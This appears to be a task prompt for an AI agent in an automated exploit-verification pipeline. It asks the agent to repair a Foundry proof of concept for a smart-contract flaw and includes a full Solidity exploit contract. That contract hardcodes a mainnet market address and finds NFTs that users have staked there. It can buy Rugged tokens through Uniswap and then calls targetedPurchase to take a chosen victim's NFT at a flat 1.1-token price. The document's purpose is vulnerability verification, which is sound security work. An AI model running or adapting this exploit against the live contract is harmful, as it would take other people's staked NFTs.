You are fixing a failing Foundry PoC for finding F-003.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Any user can buy staked NFTs out of the shared pool at a fixed 1.1-token price
- claim: `stakeNFTs()` transfers token IDs into the market contract, but the contract never records who deposited which NFT or marks them as non-sale inventory. `targetedPurchase()` later lets any caller specify arbitrary token IDs and pulls those IDs out of the contract for a flat `1.1 ether` each via `_targetedPurchase()`. That means freshly staked NFTs become immediately purchasable by anyone, regardless of the original owner’s intent.
- impact: A buyer can monitor for rare or valuable NFTs being staked and immediately extract them from the pool for the floor price, capturing the full rarity premium and leaving the original staker with only a fungible claim.
- exploit_paths: ["Victim calls `stakeNFTs([rareTokenId])` and transfers the NFT into the market contract.", "Attacker calls `targetedPurchase([rareTokenId])` and acquires that specific NFT for `1.1 ether` worth of Rugged.", "Victim can no longer recover the original NFT and is left with only the protocol\u2019s fungible accounting claim."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IMarketLike {
    function ruggedToken() external view returns (address);
    function targetedPurchase(uint256[] calldata tokenIds) external;
}

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Router02Like {
    function WETH() external pure returns (address);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
}

contract FlawVerifier {
    address public constant MARKET = 0xFe380fe1DB07e531E3519b9AE3EA9f7888CE20C6;
    address public constant UNISWAP_V2_ROUTER =
        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 public constant PRICE_PER_NFT = 1.1 ether;
    uint256 public constant MAX_TOKEN_ID = 10_000;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public hypothesisValidated;
    uint256 public acquiredTokenId;
    uint256 public ruggedSpent;
    uint256 public ruggedBalanceBefore;
    uint256 public ruggedBalanceAfter;
    bytes32 public lastStatus;

    event AttemptStatus(bytes32 status, uint256 tokenId, uint256 ruggedBalance);

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() public {
        if (hypothesisValidated) {
            return;
        }

        address rugged = IMarketLike(MARKET).ruggedToken();
        _profitToken = rugged;

        // Path stage 1 precondition:
        // a victim must already have staked an NFT before this transaction.
        // On fork, that is observable as ownerOf(tokenId) == MARKET for some tokenId <= 10_000.
        uint256 tokenId = _findMarketHeldToken(rugged);
        if (tokenId == 0) {
            lastStatus = keccak256("NO_STAKED_NFT_VISIBLE_AT_FORK");
            emit AttemptStatus(lastStatus, 0, _ruggedBalance(rugged));
            return;
        }

        // direct_or_existing_balance_first:
        // use verifier-held Rugged first; if the verifier only has ETH, try a minimal public swap
        // on the canonical Uniswap V2 router to source purchase funds without privileged state edits.
        _maybeAcquireRuggedFromHeldETH(rugged);

        ruggedBalanceBefore = _ruggedBalance(rugged);
        if (ruggedBalanceBefore < PRICE_PER_NFT) {
            lastStatus = keccak256("INSUFFICIENT_EXISTING_FUNDS_FOR_TARGETED_PURCHASE");
            emit AttemptStatus(lastStatus, tokenId, ruggedBalanceBefore);
            return;
        }

        if (!_approve(rugged, MARKET, type(uint256).max)) {
            lastStatus = keccak256("APPROVE_FAILED");
            emit AttemptStatus(lastStatus, tokenId, ruggedBalanceBefore);
            return;
        }

        // Path stage 2:
        // attacker directly buys the victim's specific staked NFT from the shared market pool.
        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;
        IMarketLike(MARKET).targetedPurchase(tokenIds);

        if (_ownerOf(rugged, tokenId) != address(this)) {
            lastStatus = keccak256("PURCHASE_DID_NOT_TRANSFER_NFT");
            emit AttemptStatus(lastStatus, tokenId, _ruggedBalance(rugged));
            return;
        }

        acquiredTokenId = tokenId;
        hypothesisValidated = true;
        ruggedBalanceAfter = _ruggedBalance(rugged);
        ruggedSpent = ruggedBalanceBefore > ruggedBalanceAfter
            ? ruggedBalanceBefore - ruggedBalanceAfter
            : 0;

        // Profit path note:
        // the core bug proves theft of a specific victim-staked NFT for a flat 1.1 Rugged price.
        // Realized fungible profit requires a live on-chain exit above cost (for example, a preexisting bid).
        // This verifier intentionally does not fabricate that exit; absent such a bid, net realized profit is zero.
        _profitAmount = 0;
        lastStatus = keccak256("HYPOTHESIS_VALIDATED_NFT_STOLEN");
        emit AttemptStatus(lastStatus, tokenId, ruggedBalanceAfter);
    }

    function profitToken() external view returns (address) {
        if (_profitToken != address(0)) {
            return _profitToken;
        }
        return IMarketLike(MARKET).ruggedToken();
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _findMarketHeldToken(address rugged) internal view returns (uint256) {
        for (uint256 tokenId = 1; tokenId <= MAX_TOKEN_ID; tokenId++) {
            if (_ownerOf(rugged, tokenId) == MARKET) {
                return tokenId;
            }
        }
        return 0;
    }

    function _ownerOf(address token, uint256 tokenId) internal view returns (address owner) {
        (bool ok, bytes memory data) =
            token.staticcall(abi.encodeWithSelector(0x6352211e, tokenId));
        if (!ok || data.length < 32) {
            return address(0);
        }
        owner = abi.decode(data, (address));
    }

    function _ruggedBalance(address rugged) internal view returns (uint256) {
        return IERC20Like(rugged).balanceOf(address(this));
    }

    function _approve(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(0x095ea7b3, spender, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _maybeAcquireRuggedFromHeldETH(address rugged) internal {
        if (_ruggedBalance(rugged) >= PRICE_PER_NFT || address(this).balance == 0) {
            return;
        }

        address[] memory path = new address[](2);
        path[0] = IUniswapV2Router02Like(UNISWAP_V2_ROUTER).WETH();
        path[1] = rugged;

        try IUniswapV2Router02Like(UNISWAP_V2_ROUTER)
            .swapExactETHForTokensSupportingFeeOnTransferTokens{value: address(this).balance}(
            0, path, address(this), block.timestamp
        ) {} catch {
            // If no liquid V2 route exists at the fork, the verifier continues with whatever
            // Rugged balance it already holds and reports insufficient funds if still below price.
        }
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 0
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
